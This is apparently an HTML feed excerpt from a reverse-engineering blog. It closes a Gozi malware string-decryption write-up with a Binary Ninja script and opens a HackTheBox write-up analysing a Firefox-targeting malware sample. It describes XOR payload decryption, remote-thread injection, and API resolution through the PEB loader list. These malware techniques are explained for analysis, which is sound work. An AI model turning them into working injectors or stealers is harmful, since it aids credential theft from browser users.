&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">key = &amp;#39;Apr &amp;#39; + &amp;#39;26 2&amp;#39; + &amp;lt;.bss rva&amp;gt; + some int - 1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Some int is a value picked up from calling &lt;code>NtQuerySystemInformation&lt;/code> and grabbing a &lt;code>dword&lt;/code> from it.
The value itself doesn&amp;rsquo;t matter, because that value is divided by &lt;code>0x13&lt;/code> and only the remainder is used, and then two values, the &lt;code>NTSTATUS&lt;/code> return value and 1, are added to it.
&lt;code>STATUS_SUCCESS&lt;/code> is defined as &lt;code>0x0&lt;/code>, so as long as &lt;code>NtQuerySystemInformation&lt;/code> succeeds, we are only really adding 1 to our remainder.
Hence the possible values of this mystery integer are 1 - 0x14.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/7.png"
width="615"
height="700"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/7_huf6506cc8afd5f4613c8f335fcf7e494c_59389_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/7_huf6506cc8afd5f4613c8f335fcf7e494c_59389_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Figuring out what the mystery integer is supposed to be&amp;hellip;"
class="gallery-image"
data-flex-grow="87"
data-flex-basis="210px"
>&lt;/p>
&lt;h2 id="final-script">Final Script
&lt;/h2>&lt;p>Through a little brute force, you can figure out that the secret value is supposed to be 18.
Here&amp;rsquo;s the final script I used, its meant to be ran with &lt;code>Binja&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">binaryninja&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">BinaryReader&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decrypt_strings&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">secret_sauce&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bss&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_section_by_name&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.bss&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">br&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">bss&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bss&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">bv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># TODO: Get key dynamically&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;Apr &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;26 2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">key1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">key2&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">rva&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">secret_sauce&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x400&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">curr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">key&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">curr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">result&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prev&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">curr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">decrypt_strings&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/8.PNG"
width="1432"
height="465"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/8_hu8fb8e0f89723b469dc90092733f68595_70648_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/8_hu8fb8e0f89723b469dc90092733f68595_70648_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Final decrypted strings"
class="gallery-image"
data-flex-grow="307"
data-flex-basis="739px"
>&lt;/p></description></item><item><title>HTB REV Challenge FFModule</title><link>https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/</link><pubDate>Mon, 06 Nov 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/hackthebox.jpg" alt="Featured image of post HTB REV Challenge FFModule" />&lt;blockquote>
&lt;p>&lt;strong>Challenge Description&lt;/strong>: After more and more recent hits of the infamous Jupiter Banking Malware we finally managed to get a sample of one module.
Supposedly it steals secrets from Firefox users?&lt;/p>
&lt;/blockquote>
&lt;h2 id="initial-analysis">Initial Analysis
&lt;/h2>&lt;p>&lt;code>PEBear&lt;/code> show little to no imports so I can assume that the import table is being obfuscated or functions are being dynamically imported at runtime.
Also, based on the challenge description I think I can probably find the flag once I figure out exactly what it is doing with FireFox, or what secrets it is stealing.&lt;/p>
&lt;h2 id="ida">IDA
&lt;/h2>&lt;p>The &lt;code>main&lt;/code> function is pretty straightforward.
A payload is decrypted via single byte XOR decryption routine, then the payload is injected into a remote thread in the Firefox process.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/1.PNG"
width="593"
height="320"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/1_huf698b4cc59553993bf227aa83159efb6_18352_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/1_huf698b4cc59553993bf227aa83159efb6_18352_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Payload is decrypted"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="444px"
> &lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/2.PNG"
width="904"
height="678"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/2_hu403c5e4b22a073d4b43b9c41affd1679_43011_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/2_hu403c5e4b22a073d4b43b9c41affd1679_43011_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Remote thread runs decrypted payload"
class="gallery-image"
data-flex-grow="133"
data-flex-basis="320px"
>&lt;/p>
&lt;p>Since the decryption is so simple, I just ran through the decryption, then patched the executable using &lt;code>HxD&lt;/code> to contain the original payload.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/3.PNG"
width="956"
height="944"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/3_hu2cd106c07b5ab0c0dd176b1fd6db4658_119686_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/3_hu2cd106c07b5ab0c0dd176b1fd6db4658_119686_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Extracting decrypted payload as hex stream"
class="gallery-image"
data-flex-grow="101"
data-flex-basis="243px"
>&lt;/p>
&lt;p>Now we can view the decrypted payload in IDA.
The first line of code seems to get a pointer to some loaded DLL, then search through its function names until it finds the one that has the inverted CRC checksum of &lt;code>0x43AAC47D&lt;/code> which uninverted is &lt;code>0xBC553B82&lt;/code>.
This is definitely some form of dynamic API importing.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/4.PNG"
width="912"
height="351"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/4_hucd6ddd16656772f5842c2b344cc47aa5_24539_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/4_hucd6ddd16656772f5842c2b344cc47aa5_24539_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="First bit of code that runs"
class="gallery-image"
data-flex-grow="259"
data-flex-basis="623px"
>&lt;/p>
&lt;p>&lt;code>NtCurrentTeb()&lt;/code> will return a pointer to a &lt;code>TEB&lt;/code> structure.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_TEB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PPEB&lt;/span> &lt;span class="n">ProcessEnvironmentBlock&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">399&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved3&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1952&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">TlsSlots&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved5&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">ReservedForOle&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved6&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">TlsExpansionSlots&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">TEB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PTEB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This structure is then used to access the Process Environment Block, which as you can guess contains process information.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_PEB&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">BeingDebugged&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved3&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PPEB_LDR_DATA&lt;/span> &lt;span class="n">Ldr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PRTL_USER_PROCESS_PARAMETERS&lt;/span> &lt;span class="n">ProcessParameters&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved4&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">AtlThunkSListPtr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved5&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">Reserved6&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved7&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">Reserved8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">AtlThunkSListPtr32&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved9&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">45&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved10&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">96&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PPS_POST_PROCESS_INIT_ROUTINE&lt;/span> &lt;span class="n">PostProcessInitRoutine&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved11&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved12&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">SessionId&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">PEB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Then the &lt;code>Ldr&lt;/code> structure is grabbed which contains information about the loaded modules:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_PEB_LDR_DATA&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InMemoryOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">PEB_LDR_DATA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB_LDR_DATA&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The &lt;code>InMemoryOrderModuleList&lt;/code> is just a doubly linked list of the modules that are loaded into the process.
So this code is parsing through the loaded modules until it finds the one it wants, which it assumes will always be at the same location.
What module is this?
In order to find out, we have to use &lt;code>x64dbg&lt;/code> to run through this process until it write the payload over the Firefox process memory space, attach to the firefox process, and run the code until we find the module it wants.&lt;/p>
&lt;h2 id="remote-thread">Remote Thread
&lt;/h2>&lt;p>So I boot up &lt;code>x64dbg&lt;/code>, set breakpoints at &lt;code>OpenProcess&lt;/code>, &lt;code>VirtualAllocEx&lt;/code>, and &lt;code>VirtualProtectEx&lt;/code>.
The reason I don&amp;rsquo;t break at &lt;code>CreateRemoteThread&lt;/code> is because I will create the thread myself.
Why would I do that?
I was having trouble with attaching to the thread that &lt;code>ffmodule&lt;/code> creates, and just found it was easier this way.
Just make sure you note down the handle you get from &lt;code>OpenProcess&lt;/code> and the address that &lt;code>VirtualAllocEx&lt;/code> gives you so you attach to the correct process and then are able to set a break point at the correct spot (which in my case was &lt;code>0x00000182CC7F0000&lt;/code>).&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/5.PNG"
width="852"
height="85"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/5_huad7955c6ff6f0d38345b526c5104fa37_8183_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/5_huad7955c6ff6f0d38345b526c5104fa37_8183_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Handle to FireFox process"
class="gallery-image"
data-flex-grow="1002"
data-flex-basis="2405px"
> &lt;img src="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/6.PNG"
width="837"
height="139"
srcset="https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/6_hu1fe21c9becaaf70c654a5911e23ba736_13541_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/6_hu1fe21c9becaaf70c654a5911e23ba736_13541_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Address of payload"
class="gallery-image"
data-flex-grow="602"
data-flex-basis="1445px"
>&lt;/p>
&lt;p>Then we continue until the instruction right after &lt;code>VirtualProtectEx&lt;/code> since at this point the payload is written, and can be executed in the remote process.&lt;/p>
&lt;p>Now we just head over to the &lt;code>Handles&lt;/code> tab to find the &lt;code>PID&lt;/code> for our handle, and attach to the process.
Then head over to the address we got from &lt;code>VirtualAllocEx&lt;/code>.
We know we got the right address because the instructions here will match the instructions from the decrypted payload in ghidra.&lt;/p>
